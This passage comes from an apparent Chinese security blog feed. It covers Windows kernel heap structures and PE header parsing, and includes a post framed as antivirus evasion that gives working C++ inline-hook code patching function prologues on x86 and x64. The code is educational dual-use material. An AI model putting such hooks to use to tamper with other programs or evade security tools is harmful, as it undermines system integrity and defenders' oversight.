class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_LFH_CONTEXT</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x008</span> Callbacks        : <span class="comment">//子堆分配回调函数</span></span><br><span class="line">......</span><br><span class="line">   +<span class="number">0x080</span> Buckets          : [<span class="number">129</span>] <span class="comment">//前面提到过LFH处理常见129种堆</span></span><br><span class="line"><span class="comment">//这里的bucket就存放每个堆的列表</span></span><br><span class="line"><span class="comment">//保存有关块大小、子段计数、块计数的数据</span></span><br></pre></td></tr></table></figure><p><strong>_HEAP_VS_CONTEXT</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> Lock             : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> LockType         : _RTLP_HP_LOCK_TYPE</span><br><span class="line">   +<span class="number">0x010</span> FreeChunkTree    : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x020</span> SubsegmentList   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x030</span> TotalCommittedUnits : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> FreeCommittedUnits : Uint8B</span><br><span class="line">   +<span class="number">0x040</span> DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT</span><br><span class="line">   +<span class="number">0x080</span> BackendCtx       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x088</span> Callbacks        : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">   +<span class="number">0x0b0</span> Config           : _RTL_HP_VS_CONFIG</span><br><span class="line">   +<span class="number">0x0b4</span> Flags            : Uint4B</span><br></pre></td></tr></table></figure><p>注释关键信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_VS_CONTEXT</span><br><span class="line">......</span><br><span class="line">   +<span class="number">0x020</span> SubsegmentList   : <span class="comment">//所有VS类型的子段</span></span><br><span class="line">   +<span class="number">0x030</span> TotalCommittedUnits : <span class="comment">//计数</span></span><br><span class="line">   +<span class="number">0x038</span> FreeCommittedUnits : <span class="comment">//计数</span></span><br><span class="line">......</span><br><span class="line">   +<span class="number">0x088</span> Callbacks        : <span class="comment">//allocate, free, commit等子段回调函数</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>总结下两种上下文</p><p><img src="https://img.joe1sn.top/uploads/big/09b816568e627599cec85957350f2d0c.png" alt="image-20240317112721755" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;文章来自blackhat 2021的文章《Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded》&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf&quot;&gt;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Youtube：&lt;a href=&quot;https://www.youtube.com/watch?v=VvxNc8GTFfk&quot;&gt;https://www.youtube.com/watch?v=VvxNc8GTFfk&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】Windows Inline Hook小结</title>
    <link href="https://joe1sn.eu.org/2024/03/15/little-hook/"/>
    <id>https://joe1sn.eu.org/2024/03/15/little-hook/</id>
    <published>2024-03-15T05:47:31.000Z</published>
    <updated>2024-03-15T06:09:23.308Z</updated>
    
    <content type="html"><![CDATA[<p>Inline Hook还是挺好玩的</p><p>文章很短，只是打个总结，记录一些有趣的发现</p><span id="more"></span><h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1><p>之前在学习hook的时候，发现抄的一段代码只能在Debug模式下运行，调试后发现MSVC很有趣的一个点</p><p>当我们使用Debug模式编译的时候，程序为了调试方便，会将所有函数加入这个表中</p><p>比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">oldtest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;not hook&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">oldtest</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照直觉<img src="https://img.joe1sn.top/uploads/big/45f2ae66613617bdfe44a54f286f7ab5.png" alt="image-20240315135117012" /></p><p>这里的<code>call</code>应该会直接来到函数的位置，但是真实情况并非如此</p><p><img src="https://img.joe1sn.top/uploads/big/f9b93b22f4d696e77ab104663a1504dd.png" alt="image-20240315135138849" /></p><p>我们会发现一张跳表，根据距离这张表的地址差进行跳转，那段hook只是修改了这一段代码</p><h1 id="x86-hook"><a class="markdownIt-Anchor" href="#x86-hook"></a> x86 hook</h1><p>首先是<code>x86</code>为啥叫32位架构，最突出的就是一个寄存器有32位(bit)大小，那么计算一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1&lt;&lt;32)/int(1024*1024*1024) = 4</span><br></pre></td></tr></table></figure><p>没错，32位的寄存器最多只能存放4GB个数字（比如从<code>1</code>到<code>0x100000000</code>），<br />由于要做加减发（有负数），所以能找到的地址位<code>±2GB</code>，<br />那么8位为一个字节，那么一个寄存器只能由4个字节，<br /><code>jmp</code>根据4字节这样对齐，所以32位下我们只需要<strong>覆盖5字节</strong>就能实现任意地址的跳转，<br />再加上之前的debug模式，可以写出下列hook代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hooks::InlineHook_x32</span><span class="params">(FuncAddr HookFunction)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//set read write</span></span><br><span class="line">    DWORD old;</span><br><span class="line">    DWORD size = <span class="number">5</span>;</span><br><span class="line">    FuncAddr offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(<span class="keyword">this</span>-&gt;FunctionAddr), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">    <span class="comment">//hook with debug jmp table</span></span><br><span class="line">    offset = HookFunction - <span class="keyword">this</span>-&gt;FunctionAddr - <span class="number">5</span>;</span><br><span class="line">    *(<span class="type">char</span>*)<span class="keyword">this</span>-&gt;FunctionAddr = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">1</span>) = offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return to the origin</span></span><br><span class="line">    size = <span class="number">5</span>;</span><br><span class="line">    FuncAddr RealAddr = <span class="keyword">this</span>-&gt;<span class="built_in">GetRealAddr</span>((<span class="type">void</span> *)HookFunction);</span><br><span class="line">    FuncAddr func_size = <span class="keyword">this</span>-&gt;<span class="built_in">GetProcSize</span>(RealAddr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(RealAddr + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="type">char</span>*)(RealAddr + func_size + <span class="number">0</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    offset = <span class="keyword">this</span>-&gt;RealAddr - RealAddr;</span><br><span class="line">    *(DWORD*)(RealAddr + func_size + <span class="number">1</span>) = (offset - func_size - <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">//get first 5 bytes</span></span><br><span class="line">    <span class="type">char</span> head[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(head, (<span class="type">void</span>*)<span class="keyword">this</span>-&gt;FunctionAddr, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (HookFunction &gt; <span class="keyword">this</span>-&gt;FunctionAddr)</span><br><span class="line">        offset = (HookFunction - <span class="keyword">this</span>-&gt;FunctionAddr - <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        offset = ~(<span class="keyword">this</span>-&gt;FunctionAddr - HookFunction - <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">char</span>*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">0</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">1</span>) = offset - <span class="number">9</span>; <span class="comment">//API hook</span></span><br><span class="line">    <span class="comment">//*(DWORD*)(this-&gt;FunctionAddr + 1) = offset;   //</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//return to the origin</span></span><br><span class="line">    FuncAddr func_size = <span class="keyword">this</span>-&gt;<span class="built_in">GetProcSize</span>(HookFunction) - <span class="number">1</span>;</span><br><span class="line">    size = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(HookFunction + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reset the top 5bytes in header</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((FuncAddr)HookFunction + func_size), head, <span class="number">5</span>);</span><br><span class="line">    *(<span class="type">char</span>*)(HookFunction + func_size + <span class="number">5</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    <span class="comment">//*(DWORD*)(HookFunction + func_size + 6) = ~(offset + func_size + 9);</span></span><br><span class="line">    *(DWORD*)(HookFunction + func_size + <span class="number">6</span>) = ~(offset + func_size);    <span class="comment">//win api hook</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="x64-hook"><a class="markdownIt-Anchor" href="#x64-hook"></a> x64 hook</h1><p>上面讲到了x86 hook只能2GB内内存寻址，到了x64寻址空间大大加大，单纯<code>jmp</code>和<code>call</code>已经无法跳转到地址，后来我看到一个很有意思的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push addr.low</span><br><span class="line">    mov dword [rsp+4], addr.high</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>这个方法不会污染寄存器，也不会对栈造成影响，所以得到hook函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Hook::EnHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;OldFuncOpcode != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!]Already Hooked\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    <span class="keyword">this</span>-&gt;OldFuncOpcode = (PBYTE)<span class="built_in">malloc</span>(<span class="keyword">this</span>-&gt;OpSzie + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;OldFuncOpcode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!] Hook Function Malloc Failed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;OldFuncOpcode, (<span class="type">void</span>*)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Capture The First &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;OpSzie &lt;&lt; <span class="string">&quot; Bytes: &quot;</span>;</span><br><span class="line">    <span class="function">std::vector&lt;BYTE&gt; <span class="title">vec</span><span class="params">(<span class="keyword">this</span>-&gt;OldFuncOpcode, <span class="keyword">this</span>-&gt;OldFuncOpcode + <span class="keyword">this</span>-&gt;OpSzie)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; std::hex;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : vec)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; std::dec &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Now Start Hook\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *     push 0x10000</span></span><br><span class="line"><span class="comment">    *     mov dword [rsp+4], 0x20000</span></span><br><span class="line"><span class="comment">    *     ret</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//over write to jmp</span></span><br><span class="line">    FuncAddr gap = <span class="keyword">this</span>-&gt;NewFunc;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)gap;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(gap &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Jmp Code Set\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    <span class="built_in">memcpy</span>((PVOID)<span class="keyword">this</span>-&gt;OldFunc, jmpopcode, <span class="keyword">this</span>-&gt;OpSzie);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Opcode Set\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存好覆盖的字节，后续接触hook的时候再覆盖回来</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Inline Hook还是挺好玩的&lt;/p&gt;
&lt;p&gt;文章很短，只是打个总结，记录一些有趣的发现&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PE文件分析</title>
    <link href="https://joe1sn.eu.org/2024/02/25/PeFile/"/>
    <id>https://joe1sn.eu.org/2024/02/25/PeFile/</id>
    <published>2024-02-25T15:17:26.000Z</published>
    <updated>2024-02-25T15:24:44.794Z</updated>
    
    <content type="html"><![CDATA[<p>最近代码能力飞速提升，顺便复习一下</p><span id="more"></span><p>一般就是</p><ul><li>DOS头：<code>IMAGE_DOS_HEADER</code>结构体</li><li>PE头：<code>IMAGE_NT_HEADERS</code>结构体</li><li>Section头：<code>IMAGE_SECTION_HEADER</code>结构体</li></ul><p>OK，如果要分析PE文件的话，首先把文件读取出来</p><p>那么如何解析呢？这就是C/C++非常方便的一点：直接使用结构体转换，例如把地址值解析为数值<br />总体就是解释内存中的值</p><h1 id="dos-头"><a class="markdownIt-Anchor" href="#dos-头"></a> DOS 头</h1><p>先看DOSHeader吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>需要的是<code>e_lfanew</code></p><h1 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h1><p><strong>文件起始地址+e_lfanew = NT头位置</strong></p><p>得到NT头位置后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><p>重要的是<code>IMAGE_OPTIONAL_HEADER</code>，其实都一样，可以从<code>FileHeader</code>得到32位还是64位，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>0x8664：adm64位</li><li>0x014C：intel32位</li></ul><p>接下来以64位举例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;</span><br><span class="line">    BYTE        MajorLinkerVersion;</span><br><span class="line">    BYTE        MinorLinkerVersion;</span><br><span class="line">    DWORD       SizeOfCode;</span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;</span><br><span class="line">    DWORD       BaseOfCode;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">    DWORD       SectionAlignment;</span><br><span class="line">    DWORD       FileAlignment;</span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;</span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;</span><br><span class="line">    DWORD       NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><p>到这里我写了部分代码，结合IDA就很好理解了</p><p><img src="https://img.joe1sn.top/uploads/big/552a423436db68a5ea7e49711a57cb44.png" alt="image-20240225161644926" /></p><p>如果还要继续看的话就是<code>DataDirectory</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DATA_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>打印虚拟地址</p><p><img src="https://img.joe1sn.top/uploads/big/0907bace88fffe9b2e7c5ed8eb1cd797.png" alt="img" /></p><p>其实就是导入导出表之类的东西</p><p><img src="https://img.joe1sn.top/uploads/big/7d2269db3ad4229508b16f42af1ed2dc.png" alt="image-20240225163401598" /></p><p>Nt-&gt;ImageBase+这里的偏移，就是运行时的位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 